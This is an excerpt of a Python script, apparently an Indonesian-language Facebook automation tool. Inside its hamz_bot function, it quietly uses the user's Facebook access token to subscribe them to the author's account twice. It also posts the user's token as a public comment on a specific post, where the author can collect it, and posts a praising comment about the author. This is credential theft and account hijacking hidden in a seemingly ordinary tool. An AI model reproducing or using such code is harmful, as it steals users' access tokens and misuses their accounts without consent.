...
os.system("xdg-open https://www.facebook.com/zhea.rezpectharufa?text=Hallo%20Bang%20Ganteng")
# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
...
def hamz_bot():
    try:
        ...
        print ('[! Token invalid') 
        os.system('rm -rf login.txt')
    kom = " Bang @[100063559743413:] Ganteng Bangetz Ngga Ada Obat "
    requests.post('https://graph.facebook.com/100063559743413/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100063559743413/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/356162966512359/comments/?message=' +token+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/356162966512359/comments/?message=' +kom+ '&access_token=' + token)
    menu()
